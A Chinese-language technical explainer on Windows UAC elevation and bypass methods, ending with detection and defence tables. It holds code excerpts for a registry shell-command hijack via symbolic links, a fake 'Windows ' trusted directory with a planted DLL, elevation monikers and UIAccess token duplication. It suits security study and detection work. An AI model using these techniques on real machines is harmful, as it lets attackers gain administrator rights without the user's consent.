UAC机制原理

UAC架构

UAC提升流程
  1. 用户/程序请求提升权限
  2. 请求发送到AppInfo服务
  3. AppInfo验证请求和应用程序
  4. 检查是否为auto-elevation程序
  5. 如需确认，启动Consent.exe显示提示
  6. 用户确认后，创建提升进程
  7. 返回进程信息给请求者

关键组件

组件 作用 权限
AppInfo服务 处理UAC提升请求 SYSTEM
Consent.exe 显示UAC提示界面 SYSTEM
LSASS 令牌创建和管理 SYSTEM
auto-elevation 自动提升机制 无需用户确认

自动提升条件

auto-elevation程序特征
  • 位于可信目录(System32, Program Files等)
  • 由Microsoft签名
  • 在注册表中配置为auto-elevation
  • 特定的文件名或GUID
  • 某些COM接口支持auto-elevation

注册表Shell劫持

技术原理

通过修改注册表中的Shell\Open\Command键值，劫持特定应用程序或协议的打开行为，使其执行攻击者指定的payload。

实现步骤

// 1. 创建Slave键(包含payload) ucmxCreateSlaveKey(classesKey, lpszPayload, &szSlaveKey[1]); // Slave键结构: // HKCU\Software\Classes\{GUID} // (Default) = "payload路径" // DelegateExecute = "" (空值) // 2. 创建Master键并设置符号链接 _strcat(szMasterKey, T_SHELL_OPEN); // shell\open RegCreateKeyEx(classesKey, szMasterKey, ...); // 3. 创建command键为符号链接 NtCreateKey(&targetKey, KEY_ALL_ACCESS, &obja, REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE, ...); NtSetValueKey(targetKey, &CmSymbolicLinkValue, 0, REG_LINK, usSlaveKey.Buffer, usSlaveKey.Length); // 4. 触发目标程序 ShellExecuteEx(&shinfo);

目标程序/协议

目标 注册表路径 触发方式
ms-settings: ms-settings\shell\open\command 打开ms-settings:协议
sdclt.exe sdclt\shell\open\command 运行sdclt.exe
changepk.exe Launcher\shell\open\command 运行changepk.exe
NtSetValueKey (REG_LINK)
设置注册表键值，REG_LINK类型创建符号链接。

符号链接可以重定向注册表查询到另一个键路径。

关键点: DelegateExecute

DelegateExecute值必须设置为空。如果存在此值，系统会使用COM委托执行而非直接执行命令。设置为空可绕过COM验证机制。

可信目录模拟

技术原理

利用Windows路径解析的特殊行为，创建带有空格的虚假"Windows"目录，通过重解析点将其指向攻击者控制的目录，绕过可信目录验证。

实现步骤

// 1. 在%temp%创建system32目录 _strcpy(szPayloadDir, g_ctx->szTempDirectory); _strcat(szPayloadDir, L"system32\\"); CreateDirectory(szPayloadDir, NULL); // 2. 将payload写入为winmm.dll _strcat(szDest, WINMM_DLL); // winmm.dll supWriteBufferToFile(szDest, ProxyDll, ProxyDllSize); // 3. 复制winsat.exe到%temp%\system32 CopyFile(szSource, szDest, FALSE); // 4. 创建虚假"Windows "目录(带空格) _strcat(szSource, L"Windows "); // 注意末尾空格! supCreateDirectory(&hFakeWindows, &ObjectAttributes, ...); // 5. 设置重解析点指向%temp% supSetMountPoint(hFakeWindows, szSource, &szSource[4]); // 6. 执行虚假路径下的winsat.exe _strcat(szSource, L"Windows \\system32\\winsat.exe"); supRunProcess(szSource, NULL);

路径解析过程

路径解析流程
  1. 请求执行: "C:\Windows \system32\winsat.exe"
  2. 解析"C:\Windows " (带空格)
  3. 发现重解析点，重定向到"%temp%"
  4. 最终路径: "%temp%\system32\winsat.exe"
  5. winsat.exe加载winmm.dll时从%temp%\system32加载
  6. 执行攻击者的winmm.dll
supSetMountPoint
设置目录的重解析点(Reparse Point)，实现目录重定向。

使用IO_REPARSE_TAG_MOUNT_POINT标签创建挂载点。

为什么需要空格?

Windows在验证可信目录时，会检查路径是否为"C:\Windows\system32"等标准路径。创建"C:\Windows "目录(带空格)可以绕过这个验证，因为系统会先解析这个特殊目录名，然后通过重解析点重定向。

提升Moniker

// 提升Moniker格式 "Elevation:Administrator!new:{CLSID}" "Elevation:Highest!new:{CLSID}" // 使用示例 HRESULT ucmAllocateElevatedObject(LPCWSTR lpObjectCLSID, ...) { BIND_OPTS3 bop; WCHAR szMoniker[MAX_PATH]; bop.cbStruct = sizeof(bop); bop.dwClassContext = CLSCTX_LOCAL_SERVER; // 构造提升Moniker _strcpy(szMoniker, T_ELEVATION_MONIKER_ADMIN); _strcat(szMoniker, lpObjectCLSID); // 通过提升Moniker获取提升后的COM对象 HRESULT hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject); }

令牌操作技术

UIAccess令牌获取

// 启动osk.exe(屏幕键盘，具有UIAccess权限) shinfo.lpFile = "C:\\Windows\\System32\\osk.exe"; ShellExecuteEx(&shinfo); // 打开进程令牌 NtOpenProcessToken(shinfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken); // 复制令牌 NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &obja, FALSE, TokenPrimary, &hDupToken);

完整性级别修改

// 降低完整性级别从Medium+到Medium RtlAllocateAndInitializeSid(&MLAuthority, 1, SECURITY_MANDATORY_MEDIUM_RID, 0, 0, 0, 0, 0, 0, 0, &pIntegritySid); tml.Label.Attributes = SE_GROUP_INTEGRITY; tml.Label.Sid = pIntegritySid; NtSetInformationToken(hDupToken, TokenIntegrityLevel, &tml, sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid));

完整性级别定义

级别 RID值 数值 说明
Untrusted 0x0000 0x00000000 不可信
Low 0x1000 0x00001000 低完整性
Medium 0x2000 0x00002000 中等完整性
Medium+ 0x2100 0x00002100 中等+ (UIAccess)
High 0x3000 0x00003000 高完整性
System 0x4000 0x00004000 系统完整性
NtSetInformationToken
设置令牌信息，包括完整性级别。

TokenIntegrityLevel类用于修改令牌的完整性级别。

UIAccess权限特性
  • 允许与更高完整性级别的窗口交互
  • 用于辅助功能程序(屏幕键盘、放大镜等)
  • 完整性级别为Medium+ (0x2100)
  • 降低到Medium后仍保持UIAccess能力
  • 可绕过某些UI隔离限制

防御与检测

检测方法

检测点 方法 特征
注册表修改 监控Shell\Open\Command键 异常的符号链接或DelegateExecute为空
目录创建 监控特殊目录名 "Windows "等带空格的目录名
重解析点 监控IO_REPARSE_TAG_MOUNT_POINT 指向非标准位置的重解析点
COM调用 监控提升Moniker "Elevation:Administrator"字符串
AppInfo RPC 监控RAiLaunchAdminProcess 异常的启动参数或路径

防御措施

建议防御措施
  1. 启用UAC最高级别(AlwaysNotify)
  2. 监控关键注册表键的修改
  3. 检测异常的目录和重解析点创建
  4. 审计auto-elevation COM类的使用
  5. 部署EDR监控AppInfo RPC调用
  6. 限制UIAccess应用程序的令牌使用
  7. 定期更新系统修复已知漏洞

UAC级别说明

级别 设置 防护效果
AlwaysNotify 最高 所有提升都需要确认，阻止大部分绕过
Default 默认 非Windows程序需要确认，部分绕过有效
Default-NoElevate 中低 不提示桌面变化，更多绕过有效
NeverNotify 最低 完全禁用UAC，所有绕过都有效
